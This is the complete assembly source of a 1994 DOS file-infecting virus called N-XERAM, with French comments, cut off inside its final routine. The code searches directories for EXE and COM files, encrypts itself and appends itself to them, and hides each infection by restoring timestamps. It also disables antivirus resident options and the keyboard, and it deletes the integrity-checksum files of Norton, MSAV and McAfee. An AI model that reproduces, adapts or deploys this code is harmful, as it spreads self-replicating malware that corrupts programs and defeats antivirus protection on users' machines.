;                    ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ» 
;                    º                                 ºÛ
;                    º    N-XERAM  10/12/1994  V1.0    ºÛ
;                    º     Intruder              JMB   ºÛ
;                    º                                 ºÛ                   
;                    ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼Û  
;                      ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


		.SEQ

; D‚finition du programme HOTE

HOSTSEG         SEGMENT BYTE
		ORG 100H
		ASSUME CS:HOSTSEG,DS:HOSTSEG



HOST:   DB 0E9h                 ;jmp VIRUS_COM                        
	DW 01A7h                        
	push cs
	pop ds
	mov ah,09H
	mov dx,OFFSET MESSAGE
	int 21H                 ;Affiche message
	mov ah,4CH
	mov al,0
	int 21H                 ; Retour au Dos
MESSAGE: DB 'N-XERAM : CODE PARASITAIRE AUTOPROPAGEABLE DECLENCHE.',07,'$'
	nop

HOSTSEG     ENDS
	
HSTACK  SEGMENT PARA STACK
	DB 16H DUP (?)
HSTACK  ENDS




;*****************************************************************************
; Programme du Virus

STACKSIZE       EQU 100H        ;taille de la pile du CPA
NUMRELS         EQU 2           ; Nombre de relocations ds le CPA

VSEG    SEGMENT PARA
	ASSUME CS:VSEG,DS:VSEG,SS:VSTACK

; Zone de donn‚es du cpa
VNAME           DB 'N-XERAM',0  ;identifie cette version ;VIRUSID=2D4EH
DTA1            DB 2BH DUP (?)  ;Nouvelle Aire de Transfert Disque
DTA2            DB 56H DUP (?)  ;DTA pour r‚pertoires trouv‚s (prfdr=2)
EXEHDR          DB 1CH DUP (?)  ;Buffer pour En-tˆte EXE
EXEFILE         DB '\*.EXE',0   ;ChaŒne de recherche Fichier EXE
ALLFILE         DB '\*.*',0     ;ChaŒne de recherche Tout fichier
USEFILE         DB 78 DUP (?)   ;Zone Chemin d'accŠs fichier valide 
CHKSUM1         DB '\NCDTREE\NAV_._NO',0  ;Fichier Checksum NORTON
CHKSUM2         DB '\CHKLIST.MS',0      ;Fichier Checksum MS-DOS MSAVE
CHKSUM3         DB '\SCANVAL.VAL',0     ;Fichier checksum MAC AFEE
LEVEL           DB 0            ;Profondeur de recherche des r‚pertoires
FILE_ID         DB 1            ;1=fichier com  0=fichier exe
VSAFE_OPT       DB 0            ;Options de VSAFE
FATTR           DB 0            ;Aire de stockage Attributs vieux fichier 
OLDDTA          DD 0            ;Segment:Offset DTA d'origine
HANDLE          DW 0AH          ;Handle du fichier
FTIME           DW 0            ;Stockage heure initiale du fichier
FDATE           DW 0            ;Stockage date initiale du fichier  
FSIZE           DD 0            ;Stockage Taille du fichier
VIDC            DW 0            ;Zone recevant VIRUSID d'un nouvel h“te pour
				;voir si le virus est d‚j… l…
CRYPT_KEY       DW 0            ;Cl‚ de cryptage/d‚cryptage
H_SS            DW 0            ;Mot relocalis‚ pour SS h“te                                                             
H_SP            DW 0            ;SP du fichier h“te
CHKSUM          DB 0            ;Checksum de l'en-tˆte (inutilis‚)
FAR_JUMP:       DB 0            ;
START_IMAGE     DD 9090H:9090H  ;CS relocalis‚:IP du fichier h“te EXE   ou
				;3 1ers octets originaux du fichier h“te COM

;*****************************************************************************
;Routine principale de N-Xeram

VIRUS_COM:  
	call @PUSH_IP           ; CS courant:Virus_COM -> CS viral:Virus_EXE
@PUSH_IP: pop bx                ;bx <- pointeur
	sub bx,OFFSET @PUSH_IP
	mov cl,4                ;(IP/16)+CS -> newCS:0
	shr bx,cl
	mov cx,cs
	add cx,bx               ;cx <- nouveau cs (offset 0)
	push cx
	mov cx,OFFSET VIRUS_EXE ;cx <-nouvel IP
	push cx
	retf                    ;retire IP & CS

VIRUS_EXE:
	push ax
	push cs
	pop ds                 ;ds=cs pour le virus
	push es                ;es<- PSP Seg
	pop W[OLDDTA+2]         ;seg DTA par d‚faut=seg PSP
	mov bx,OFFSET CRYPT_CODE
	push bx                 ;pr‚pare retour d‚cryptage
CRYPT:     
DECRYPT:
	mov cx,WORDS_TO_CRYPT   ;nombre de mots … crypter
	xor si,si               ;index d‚part
	mov ax,W[CRYPT_KEY]     ;cl‚ de cryptage du fichier
	C_LOOP:
	xor WORD [si],ax        
	inc si
	inc si                  ;incr‚mente index
	cmp si,OFFSET OLDDTA    ;saute zone non-crypt‚e ?
	jne C_JUMP              ;non
	add si,OFFSET CRYPT_CODE-OFFSET OLDDTA
	C_JUMP:
	dec cx                  ;d‚cr‚mente compteur
	jnz C_LOOP              ;et boucle 
	ret
	
;Routine d'‚criture du CPA
@WRITE_CPA:
	call @SET_SIZE          ;cx<-FSIZE+2  dx<-FSIZE
	call @INT42             ;positionne pointeur, va … la fin du fichier
	call SETBDY             ;allonge taille au prochain boundary
		
	call CRYPT
	mov cx,OFFSET FINAL     ;cx <-nbre d'octets … ‚crire
	xor dx,dx               ;premier octet de code ,DS:DX 
	call @INT40             ;d‚place code virus … la fin du fichier 
				;attaqu‚ en utilisant la fonction DOS ‚criture
	call DECRYPT
	call @SET_SIZE          ;demande taille fichier pour ‚crire donn‚es
	ret
 
;Cette routine utilise la fonction d'‚criture du Dos.
@INT40:
	mov ah,40H
	int 21H
	ret

CRYPT_CODE:                     ;zone du Code encrypt‚e      
	and byte [VSAFE_OPT],0  ;d‚sactive options de VSAFE 
	call TSR_FAKER         ;et TBSCANX
	call DISTURB            ;teste date et enclenche dysfonctionnements
	call KEYB_OFF           ;d‚sactive le clavier
	call CHOOSE_FILE        ;d‚termine fichier … attaquer (EXE ou COM)
	call NEW_DTA            ;‚tablit nouvelle adresse DTA
	CALL FIND_FILE          ;cherche 1 fichier EXE … attaquer
	jnz FINISH              ;si nz,aucun fichier valide, sortie
	call SAVE_ATTRIBUTE     ;Sauvegarde attributs fichiers et laisse fichier ouvert
	push WORD [FILE_ID]     ;empile type de fichier h“te pour retour
	call INFECT             ;copie cpa /fichier trouv‚
	pop WORD [FILE_ID]      ;restaure type de fichier h“te
	call REST_ATTRIBUTE     ;Restaure attributs originaux et ferme fichier
	call NO_CHECKSUM        ;D‚truit fichier Checksum Anti-virus
FINISH: call RESTORE_DTA
	call KEYB_ON            ;restaure interruptions clavier
	call DISPLAY         
	inc byte [TBSX+1]       ;r‚active les TSR antivirus
	call TSR_FAKER         
	pop ax
	
REL:    or B[FILE_ID],0          ;teste retour EXE ou COM
	jnz REL_COM
		   
REL_EXE:                        ;Marque relocalis‚e pour SS h“te
	mov bx,[H_SS]           ;bx<-Stack segment prog.h“te
	cli                     ;d‚sactive interruptions car chgmt Pile
	mov ss,bx
	mov sp,[H_SP]           ;SP du fichier h“te
	mov B[FAR_JUMP],0EAH    ;d‚finit opcode de saut far
	mov es,WORD PTR [OLDDTA+2]     ;r‚tablit ES correctement (Seg PSP)
	push es                 ;r‚tablit DS correctement
	pop ds
	sti                     ;r‚tablit interruptions

	jmp  FAR_JUMP           ;ex‚cute saut far vers CS:IP h“te


REL_COM:
	push W[OLDDTA+2]        
	pop es                  ;r‚tablit ES initial    
	mov si,OFFSET START_IMAGE
	mov di,100H             
	push es                 ;pile <- CS h“te
	push di                 ;pile <-IP h“te
	movsw                    
	movsb                   ;ds:si -> es:di
	push es
	pop ds                  ;restaure ds
	retf                    ;retour en CS:100h

;*****************************************************************************
; Premier Niveau - Cherche 1 fichier qui passe FILE_OK
;Cette routine effectue un directory complexe pour trouver un fichier EXE ds
;le r‚pertoire courant, un de ces sous-r‚pertoires, ou le r‚pertoire racine
;ou un de ses sous-r‚pertoires, pour trouver un fichier pour lequel FILE_OK
;retourne CF=0. Si vous voulez changer la profondeur de recherche, soyez s–r
;d'allouer assez d'espace … DTA2. Cette variable n‚cessite d'avoir 2BH*LEVEL
;octets pour fonctionner, puisque la r‚cursive FINDBR utilise une DTA 
;diff‚rente pour la recherche (Cf fonctions DOS 4EH et 4FH) … chaque niveau.
;Cela retourne Z activ‚ si un fichier valide est trouv‚.
;
FIND_FILE:
				;USEFILE <-chemin courant
	mov BYTE PTR [USEFILE],'\'
	mov si,OFFSET USEFILE+1
	mov dl,0
	mov ah,47H
	int 21H                 ;Lit r‚pertoire courant, USEFILE=\dir
	cmp BYTE PTR [si],0     ;Test usefile=0.Si oui c'est le Root
	jnz FF2                 ;Ce n'est pas le r‚pertoire racine
				;effectue correction pour r‚pertoire root,
	mov BYTE PTR [USEFILE],dl ;en posant USEFILE="
FF2:    mov B[LEVEL],2          ; cherche 2 sous-rep. en profondeur
	call FINDBR             ;essaie de localiser un fichier valide
	jz FF3                  ; fichier trouv‚ ? sortie
				;sinon - essaie le r‚pertoire racine
	mov BYTE PTR [USEFILE],0     ;en posant USEFILE="
	mov B[LEVEL],1          ;profondeur recherche=1 r‚pertoire
	call FINDBR             ;essaie de trouver un fichier

FF3:    ret                     ;Sortie avec ZF mis par FINDBR

;*****************************************************************************
; Second Niveau - Recherche une branche
;Cette fonction recherche ds le r‚pertoire sp‚cifi‚ ds USEFILE des fichiers 
;EXE. AprŠs avoir explor‚ le r‚pertoire sp‚cifi‚, elle recherche les sous-
;r‚pertoires … la profondeur LEVEL. Si un fichier EXE est trouv‚ pour lequel
;FILE_OK revient avec C d‚sactiv‚, cette routine revient avec Z activ‚ et 
;laisse le fichier et le chemin dans USEFILE.
;

FINDBR:
	call FINDEXE            ;lit rep.courant pour 1er EXE
	jnc FBE3                ;trouv‚ - sortie
	cmp [LEVEL],0           ;Sinon,recherche un autre r‚pertoire?
	jz FBE1                 ;Non-sortie
	dec [LEVEL]             ;Oui, d‚cremente LEVEL et continue
	mov di,OFFSET USEFILE   ;'\rep_crt' est l…
	mov si,OFFSET ALLFILE   ;'\*.*' est l…
	call CONCAT             ;obtient '\rep_crt\*.*' ds USEFILE
	inc di                  
	push di                 ; place pointeur au premier *
	call FIRSTDIR           ;trouve premier sous-r‚pertoire
	jnz FBE                 ;non-trouv‚ ? quitte

FB1:                            ;autrement, examine-le
	pop di                  ;enlŠve *.* de USEFILE
	xor al,al
	stosb                   ;di<- al
	mov di,OFFSET USEFILE   ;usefile <- '\rep_crt\'
	mov si,OFFSET DTA2+1EH
	mov al,[LEVEL]
	mov dl,2BH              ;calcule position exacte DTA pour nom sous-rep
	mul dl                  ;qui d‚pend de la profondeur-recherche
	add si,ax               ; si pointe sur le nom du r‚pertoire
	
	call CONCAT             ;'\rep_crt\s-rep' mis dans USEFILE
	push di                 ;garde position 1Šre lettre du sous-r‚p.
	call FINDBR             ;scanne le rep. et ses sous-r‚p.
	jz FBE2                 ;si fichier EXE trouv‚, sortie
	call NEXTDIR            ;trouve prochain sous-r‚pertoire ds ce r‚pertoire
	jz FB1                  ;examine-le si recherche fructueuse

FBE:                            ;sinon sortie avec NZ et fais le m‚nage
	inc [LEVEL]             ;incr‚mente le compteur niveau avant sortie
	pop di                  ;enlŠve tout fichier ou path du r‚pertoire
	xor al,al               ;d'origine
	stosb
FBE1:   mov al,1                ;retour avec ZF non-activ‚
	or al,al
	ret

FBE2:   pop di                  ;sortie r‚ussie, vide la pile
FBE3:   xor al,al               ;positionne ZF
	ret                     ;sortie

;*****************************************************************************
;TroisiŠme niveau - Partie A - Trouve un fichier EXE
;Cette proc‚dure recherche dans le path USEFILE un fichier EXE qui passe
;le test FILE_OK. Le chemin complet du fichier EXE sera contenu dans
;USEFILE,et le ZF sera … 0 en cas de succŠs.

FINDEXE:
	mov dx,OFFSET DTA1      ; positionne nouvelle DTA pour recherche EXE
	mov ah,1AH
	int 21H
	mov di,OFFSET USEFILE
	mov si,OFFSET EXEFILE
	call CONCAT             ;USEFILE <- '\dir\*.EXE'
	inc di
	push di                 ;garde position de '*' sur '*.EXE'
	mov dx,OFFSET USEFILE
	mov cx,3FH              ;recherche 1Šre n'importe quel fichier
	mov ah,4EH
	int 21H
NEXTEXE:
	or al,al                ;retour DOS OK ?
	jnz FEC                 ;non, quitte avec CF mis
	pop di
	stosb                   ;tronque '\dir\*.EXE' en '\dir\'
	mov di,OFFSET USEFILE
	mov si,OFFSET DTA1+1EH 
	call CONCAT             ;‚tablit nomfichier '\dir\filename.exe'
	push di                 ;                         ^
	call TEST_FILE
	jnz NOCOM               ;EXE?
	call FILE_COM_OK
	jmp SHORT FE1 
NOCOM:  call FILE_OK            ;Fichier EXE bon … infecter ?
FE1:    jnc FENC                ;oui - fichier valide trouv‚,sortie avec NC
	mov ah,3EH              ;sinon ferme le fichier ‚vent. ouvert
	mov bx,[HANDLE]         ;par get_exe_header
	int 21H
	mov ah,4FH
	int 21H                 ;et cherche le prochain
	
	jmp SHORT NEXTEXE       ;et recommence test de validit‚
FEC:                            ;pas de fichier valide trouv‚,CF activ‚-sortie
	pop di
	dec di
	mov BYTE PTR [di],0     ;tronque \dir\fichier.exe en \dir
	stc
	ret
	
FENC:                           ;fichier valide trouv‚, retour avec NC
	pop di
	ret

;*****************************************************************************
;TroisiŠme niveau - Partie B - Trouve un sous-r‚pertoire
; Cette fonction recherche dans le path USEFILE des sous-r‚pertoires.
; S'il en existe un, elle revient avec ZF=1, sinon ZF=0.
;Il y a 2 points d'entr‚e ici: FIRSTDIR effectue une 1Šre recherche, et
;NEXTDIR effectue la suivante.

FIRSTDIR:
	call GET_DTA            ;retourne la bonne adresse DTA dans DX
	push dx                 ;sauvegarde DX 
	mov dx,OFFSET USEFILE
	mov cx,10H              ;recherche un r‚pertoire
	mov ah,4EH              ; fonction recherche premiŠre
	int 21H
NEXTD1: pop bx                  ; bx<- DTA
	or al,al                ; recherche r‚ussie?
	jnz NEXTD3              ;non, sortie avec NZ mis
	test BYTE PTR [bx+15H],10H  ;est-ce un r‚pertoire ?
	jz NEXTDIR              ;non, recherche un autre
	cmp BYTE PTR [bx+1EH],'.'   ;est-ce un en-tˆte de sous-r‚pertoire ?
	jne NEXTD2              ;sinon r‚pertoire valide-sortie, si oui c'est
				;un en-tˆte r‚pertoire-recherche un autre
NEXTDIR:
	call GET_DTA            ;recherche bonne adresse DTA
	push dx                 ;sauvegarde dx
	mov ah,4FH
	int 21H                 ; fonction recherche suppl‚mentaire
	jmp SHORT NEXTD1        ;boucle & v‚rifie validit‚ du retour

NEXTD2:
	xor al,al               ;sortie r‚ussie, positionne flag Z
NEXTD3:
	ret                     ; quitte la routine

;*****************************************************************************
;Retourne l'adresse DTA associ‚e au Level ds DX. Formule=OFFSET DTA2+
;(LEVEL*2BH). 

GET_DTA:
	mov dx,OFFSET DTA2
	mov al,2BH
	mul [LEVEL]
	add dx,ax               ; dx<- adresse DTA correcte
	mov ah,1AH              ; positionne DTA <-dx
	int 21H
	ret
;*****************************************************************************
;ConcatŠne deux chaŒnes.Ajoute la chaŒne ASCII de DS:SI … celle de ES:DI.
;Au retour,ES:DI pointe sur la fin de la premiŠre chaŒne ds la destination
;(ou le 1er caractŠre de la seconde chaŒne)

CONCAT:
	mov al,BYTE PTR ES:[DI] ;trouve la fin de la chaŒne 1
	inc di
	or al,al
	jnz CONCAT
	dec di                  ;DI pointe … la fin de la chaŒne
	push di                 ;sauvegarde pour retourner … l'Appeleur
CONCAT2:
	cld
	lodsb                   ; AL<- DS:SI
	stosb                   ; ES:DI<- AL
	or al,al                ; AL=0 ?
	jnz CONCAT2
	pop di                  ;restaure di pour pointer sur la fin de 
	ret                     ;la chaŒne 1

;*****************************************************************************
; D‚termine si le fichier EXE sp‚cifi‚ dans USEFILE est utilisable.
; Si oui retourne NC, sinon retourne C
; Conditions d'utilisabilit‚ :
;       a) Pr‚sence de la signature EXE 'MZ'
;       b) Nombre d'Overlay ds en-tˆte = 0
;       c) Place disponible dans la Table de Relocation pour NUMRELS pointeurs
;          suppl‚mentaires, sans devoir l'aggrandir
;       d) Le mot VIRUSID ne doit pas apparaŒtre ds les 2 octets juste avant
;         le CS:0000 initial du fichier test. Sinon, le virus est probablement
;         dans ce fichier, alors nous le sautons

FILE_OK:
	call GET_EXE_HEADER     ;Lis l'En-tˆte EXE de USEFILE dans EXEHDR
	jc OK_END               ;Fichier impossible … ouvrir, alors quitte
	call CHECK_SIG_OVERLAY  ;Nombre Overlay = 0 ?
	jc OK_END               ;non - sortie avec CF=1
	call REL_ROOM           ;Espace suffisant ds la Table de Relocation ?
	jc OK_END               ;non - sortie
	call IS_ID_THERE        ;ID pr‚sent … CS:0000
OK_END: ret                     ;retour avec C flag correctement positionn‚


;*****************************************************************************
;Cette fonction lit les 28 octets de l'en-tˆte EXE du fichier ds USEFILE.
;Elle place le header dans EXEHDR, et renvoie CF=1 en cas d'‚chec.
GET_EXE_HEADER:
	mov dx,OFFSET USEFILE
	mov ax,3D00H            ; ouverture fichier en lecture
	int 21H
	jc RE_RET               ;ouverture impossible-quitte 
	mov [HANDLE],ax         ;autrement sauvegarde le handle
	mov bx,ax               ; bx <- handle
	mov cx,1CH              ; lit 28 octets de l'en-tˆte EXE
	mov dx,OFFSET EXEHDR   ; dans ce buffer
	mov ah,3FH
	int 21H
	mov ax,W[EXEHDR+18H]    ;initialise cl‚ de cryptage
	mov W[CRYPT_KEY],ax
RE_RET: ret                     ; retour avec CF mis convenablement  

;*****************************************************************************
; Retourne C si la signature dans l'en-tˆte EXE est diff‚rente de 'MZ',ou si
; le nombre overlay est diff‚rent de z‚ro.

CHECK_SIG_OVERLAY:
				;d'abord, v‚rifie la signature
	mov ax,'ZM'            
	cmp ax,WORD PTR [EXEHDR]
	jz CSO_1                ; saute si OK
	stc
	ret
CSO_1:  xor ax,ax
	sub ax,WORD PTR [EXEHDR+26]  ;soustrait le nombre overlay de 0
	ret                     ; cf est mis si ce nombre diffŠre de 0.

;*****************************************************************************
;Cette fonction d‚termine s'il y a assez d'entr‚es dans la table de relocation
;de USEFILE. Si oui,CF=0, sinon CF=1. 
; calcul: (16*taille en-tˆte en paragraphes)-(4*nombre d'entr‚es de la table)
;-offset table de relocation = 4* NUMRELS.

REL_ROOM:     
	mov ax,WORD PTR [EXEHDR+8]     ;taille de l'en-tˆte, paragraphes
	add ax,ax
	add ax,ax                       ; multiplie par 4
	sub ax,WORD PTR [EXEHDR+6]     ; nombre de relocations
	add ax,ax
	add ax,ax                       ; multiplie par 4
	sub ax,WORD PTR [EXEHDR+24]    ; d‚but de la table de relocation
	cmp ax,4*NUMRELS                ;assez d'espace pour les pointeurs ?
RR_RET: ret                             ; sortie avec CF correctement mis       

;*****************************************************************************
; Cette fonction d‚termine si le mot … l'initial CS:0000 ds USEFILE est 
; le mˆme que VIRUSID ds le programme. Si oui,elle retourne CF=1, sinon CF=0.

IS_ID_THERE:
	mov ax,WORD PTR [EXEHDR+22]    ; CS Initial (virus?)
	add ax,WORD PTR [EXEHDR+8]     ; (CS+taille en-tˆte para.)*16
	mov dx,16                       ;=Adresse absolue CS+ en tˆte en bytes
	mul dx                          ;AX * DX = DX:AX
	mov cx,dx                       ;on transfŠre DX:AX dans CX:DX
	mov dx,ax                       ;pour le d‚placement du Pointeur 42H
LEC_ID: call @INT42                     ;pointeur positionn‚ sur VIRUSID
	dec W[VIDC]     ;altŠre VIDC au cas o— positionnement lecture incorrect 
	mov ah,3FH                      ;lecture dans fichier positionn‚
	mov dx,offset VIDC              
	mov cx,2                        ;lit 2 octets dans VIDC
	int 21H
	jc II_RET                       ;erreur lecture
	mov ax,[VIDC]
	xor ax,W[CRYPT_KEY]             ;d‚crypte 1er mot th‚orique du CPA
	cmp ax,2D4EH                    ;est-ce le VIRUSID ?
	clc
	jnz II_RET                      ;sinon le virus n'est pas ds ce fichier
	stc                             ;si oui il y est d‚j…
II_RET: ret


;*****************************************************************************
; D‚termine si le fichier sp‚cifi‚ dans USEFILE est utilisable. Si oui,
;retourne NC, sinon retourne C. Conditions d'Utilisabilit‚ :
;       a) FSIZE>4 Ko 
;       b) VIRUSID <> signature
;       c) FSIZE + 15 + 100H + NX + PILE   < 64 Ko

FILE_COM_OK:
	call GET_EXE_HEADER     ;lit les 28 1ers octets du fichier COM dans
				;EXEHDR. CF est positionn‚ en cas d'‚chec.
	jc II_RET
	mov ax,W[DTA1+26]        ;taille du fichier
	cmp ax,4096             ;FSIZE<4 Ko
	jc II_RET               ;Sinon, continue
	add ax,10FH+FINNX       ;+PSP+Borne de paragraphe+NX+Pile
	jc II_RET
;                             TEST SIGNATURE :
	mov dx,W[EXEHDR+1]       ;dx <- op‚rande th‚orique du saut d'amorce
	add dx,3                 ;distance par rapport … 0
	sub dx,OFFSET VIRUS_COM 
			;dx Šme mot … lire depuis le d‚but
	xor cx,cx
	call LEC_ID             ;lit 2 octets dans VIDC et compare
	ret
   
;*****************************************************************************
; Cette routine s'assure que la fin du fichier est … une Borne de Paragraphe,
;auquel cas le virus peut s'y attacher avec un CS valide et IP=0. 
;Assume que le pointeur de fichier est … la fin du fichier.

SETBDY:
	mov al,BYTE PTR [FSIZE]
	and al,0FH                      ; masque pour borne de paragraphe
	jz SB_E                         ; multiple de 16 - sortie
	mov cx,10H                      ;sinon,ajoute le nombre d'octets
			;n‚cessaire pour arriver … un multiple de 16
	sub cl,al       ;CL= 16 -bits restant activ‚s
	add WORD PTR [FSIZE],cx         ;ajuste FSIZE
	adc WORD PTR [FSIZE+2],0
	mov dx,OFFSET FINAL        ;place buffer pour pointer n'importe o—
	call @INT40                      ;Fonction DOS ‚criture fichier
	SB_E:   ret

;*****************************************************************************
; Infection d'un fichier EXE en 5 ‚tapes:
; a) Copie CPA sur fichier infect‚
; b) Ecrit r‚f‚rences Segment:Offset du Header s/ Saut de terminaison du CPA
; c) Ecrit r‚f‚rences Segment:Offset du CPA s/ Header 
; d) Modifie les infos du Header (taille ds pages & nbre de pointeurs)
; e) Ecrit 2 pointeurs dans Table de relocation du Header

			      
INFECT:
	call TEST_FILE           ;d‚termine type de fichier … infecter
	jne INF_EXE
	jmp INF_COM
	
INF_EXE:
	mov [FILE_ID],0          ;0 = fichier EXE
	call @WRITE_CPA          ;appelle routine d'‚criture du CPA
	;call @SET_SIZE          ;trouve 1er pointeur dans code (SS)
	add dx,OFFSET H_SS       ;il est … FSIZE+H_SS dans le fichier
	adc cx,0                 ; cx:dx <- pointeur 1
	call @INT42              ; place pointeur fichier sur 1er pointeur REL1
	mov dx,OFFSET EXEHDR+14  ; obtient SS:SP et CS:IP corrects pour 
	mov cx,10                 ; nouveau programme … partir du header EXE
	call @INT40     ;et l'‚crit aux relocalisables H_SS,H_SP & START_IMAGE
		;l'‚criture des vecteurs relocalisables est finie,
		;il reste maintenant … ajuster les valeurs de l'en-tˆte EXE
	xor cx,cx
	xor dx,dx
	call @INT42              ;positionne pointeur au d‚but du fichier
	mov dx,W[FSIZE+2]
	mov ax,W[FSIZE]          ; calcule nouveau CS initial (le CS du virus)
	mov cx,10h              ;obtenu par (FSIZE/16)-TAILLE DU HEADER
	div cx
	sub ax,WORD PTR [EXEHDR+8] ;(taille en-tˆte EXE, en paragraphes)
	mov WORD PTR [EXEHDR+22],ax ;sauvegarde ax comme CS initial
	
	mov bx,OFFSET FINAL+10H ;calcule nouveau SS initial
	mov cl,4                ;en utilisant la formule
	shr bx,cl               ;SSi=(CSi + (OFFSET FINAL + 16)/16)
	add ax,bx
	mov WORD PTR [EXEHDR+14],ax ;sauvegarde ax comme SS initial
	mov WORD PTR [EXEHDR+20],OFFSET VIRUS_EXE    ;sauvegarde IP initial
	mov WORD PTR [EXEHDR+16],STACKSIZE  ;sauvegarde SP initial
	
	mov dx,WORD PTR [FSIZE+2] ; calcule nouvelle taille du fichier
	mov ax,WORD PTR [FSIZE] 
	add ax,OFFSET FINAL        
	adc dx,0
	mov bx,512
	div bx                  ;ax<- quotient   dx<- reste
	or dx,dx                ;si reste, arrondit au quotient sup‚rieur
	jz NOREST               ;pas de derniŠre page
	inc ax                  ;intŠgre derniŠre page au compteur
NOREST: mov W[EXEHDR+4],ax      
	mov W[EXEHDR+2],dx
	
				; ajuste le compteur de pointeurs de reloc.
	add WORD PTR [EXEHDR+6],NUMRELS 
	mov cx,1CH              ;sauvegarde infos au d‚but du fichier        
	mov dx,OFFSET EXEHDR   
	mov bx,[HANDLE]
	call @INT40              ;fonction DOS ‚criture
	mov ax,WORD PTR [EXEHDR+6]
		;obtient nombre de relocalisations ds la table
	dec ax                  ;pour calculer l'emplacement o— ajouter
	dec ax                  ;les pointeurs de relocations
	mov bx,4                ;Position=(No ds tbl-2)*4 +Offset Table
	mul bx
	add ax,WORD PTR [EXEHDR+24] ;offset table
	adc dx,0                ;dx:ax=fin de la vieille table ds fichier               
	mov cx,dx
	mov dx,ax                 ;cx:dx<- dx:ax pour placer pointeur
	call @INT42               ;place pointeur fichier sur fin table reloc.        
	mov ax,WORD PTR [EXEHDR+22] ;et d‚finit 2 pointeurs:
	mov bx,OFFSET H_SS        ;CS init = seg viral
				  ;offset de H_SS
	mov WORD PTR [EXEHDR],bx  ;utilise EXEHDR comme buffer pour
	mov WORD PTR [EXEHDR+2],ax ;sauvegarder momentan‚ment ls pointeurs 
	mov bx,OFFSET START_IMAGE+2     ;CS init = seg viral
					;offset de START_IMAGE
	mov WORD PTR [EXEHDR+4],bx  ;‚crit-le ds le buffer
	mov WORD PTR [EXEHDR+6],ax  
	mov cx,8                ;puis ‚crit 8 octets de donn‚es ds le fichier
	mov dx,OFFSET EXEHDR
	mov bx,[HANDLE]
	call @INT40              ;fonction DOS ‚criture
	ret                    ;c'est fini, l'infection est termin‚e!

;*****************************************************************************
;Infection d'un fichier COM en quatre ‚tapes :
;       a) Ecrit sur le fichier infect‚ jusqu'… une borne de paragraphe
;       b) Ecrit N-XERAM … la fin du fichier infect‚ 
;       c) Ecrit 3 premiers octets d'origine du fichier infect‚ 
;           dans START_IMAGE
;       d) Ecrit Saut d'Amorce au d‚but du fichier infect‚  

INF_COM:
	mov BYTE [FILE_ID],1    ;1 = fichier COM
	call @WRITE_CPA            ;appelle routine d'‚criture du CPA
	;call @SET_SIZE          ;r‚‚crit 3 octets Start_image /cpa
	add dx,OFFSET START_IMAGE
	call @INT42
	mov cl,3
	mov dx,OFFSET EXEHDR
	call @INT40
		   
	mov B[EXEHDR],0E9H
	mov ax,W[FSIZE]
	add ax,OFFSET VIRUS_COM - 3
	mov W[EXEHDR+1],ax
	xor cx,cx
	xor dx,dx
	call @INT42             ;pointeur au d‚but 
	mov cl,3
	mov dx,OFFSET EXEHDR
	call @INT40             ;Ecriture du Saut d'Amorce
	ret

;*****************************************************************************
;Cette routine cr‚e la nouvelle position de la DTA en DTA1, et sauvegarde 
;la position initiale de la DTA dans la variable OLDDTA.
NEW_DTA:
	mov ah,2FH              ;obtient DTA courante dans ES:BX
	int 21H                 ;        (PSP:0080)
	mov WORD PTR [OLDDTA],bx        ;sauvegarde ici
	mov ax,es
	mov WORD PTR [OLDDTA+2],ax
	push cs
	pop es                  ;ES <-CS 
	mov dx,OFFSET DTA1      ;cr‚‚ nouvel offset DTA
	mov ah,1AH
	int 21H                 ;demande au DOS de la positionner
	ret

;*****************************************************************************
;Cette routine inverse l'action de NEW_DTA et restaure la DTA … sa valeur
;d'origine.
RESTORE_DTA:
	mov dx,WORD PTR [OLDDTA]   ;demande DTA origine seg:ofs
	mov ax,WORD PTR [OLDDTA+2]
	mov ds,ax
	mov ah,1AH
	int 21H                    ;commande au DOS le positionnement
	push cs                    ;restaure ds avant de sortir
	pop ds
	ret

;*****************************************************************************
; Cette routine sauvegarde les attributs originaux du fichier dans FATTR, la
;date & l'heure du fichier dans FDATE et FTIME, et la taille du fichier dans
;FSIZE. Il positionne ‚galement l'attribut fichier en lecture/‚criture, et 
;laisse le fichier ouvert en mode lecture/‚criture (puisqu'il doit ouvrir
;le fichier pour obtenir la date & la taille), avec le handle sous lequel il
;‚tait ouvert dans HANDLE. Le chemin du fichier et son nom sont dans USEFILE.
SAVE_ATTRIBUTE:
	mov ax,4300H              ;obtient attr.fichier
	mov dx,OFFSET USEFILE
	int 21H
	mov [FATTR],cl          ;sauvegarde ici
	mov ax,4301H              ;maintenant positionne attr fichier en l/e
	mov cl,0
	int 21H
	mov ax,3D02H              ;maintenant que nous savons qu'il est en l/e
	int 21H                   ;nous pouvons ouvrir le fichier
	mov [HANDLE],ax         ;sauve le handle fichier ici
	mov bx,ax               ;bx <- handle
	mov ax,5700H              ;et obtient la date & heure du fichier
	int 21H
	mov [FTIME],cx          ;et la sauve ici
	mov [FDATE],dx          ;et ici
	mov ax,WORD PTR [DTA1+28]  ;la taille du fichier ‚tait positionn‚e l…
	mov WORD PTR [FSIZE+2],ax  ;par la routine de recherche
	mov ax,WORD PTR [DTA1+26]  ;alors d‚place-la dans FSIZE
	mov WORD PTR [FSIZE],ax
	ret

;*****************************************************************************
;Restaure attribut fichier,et date & heure du fichier telles qu'elles ‚taient
;avant l'infection. Cela ferme aussi le fichier.
REST_ATTRIBUTE:
	mov dx,[FDATE]          ;obtient vieilles date & heure
	mov cx,[FTIME]
	mov ax,5701H            ;positionne  date&heure … leur valeur initiale
	mov bx,[HANDLE]
	int 21H
	mov ah,3EH              ;ferme fichier & libŠre Handle
	int 21H
	mov cl,[FATTR]
	xor ch,ch
	mov ax,4301H              ;Positionne attribut fichier valeur initiale
	mov dx,OFFSET USEFILE
	int 21H
	ret

;*****************************************************************************
;Cette routine efface le fichier Cheksum CRC de 3 antivirus r‚pandus
;aprŠs l'infection d'un fichier. Ainsi, la d‚tection de virus
;inconnus devient innefficace.

NO_CHECKSUM:
	mov dx,OFFSET CHKSUM1   ;NORTON sur r‚seau
	call @NC
	mov dx,OFFSET CHKSUM1+8      ;NORTON
	call @NC
	mov dx,OFFSET CHKSUM2   ;MSAVE DOS 6
	call @NC
	mov dx,OFFSET CHKSUM3   ;MAC AFEE
	call @NC
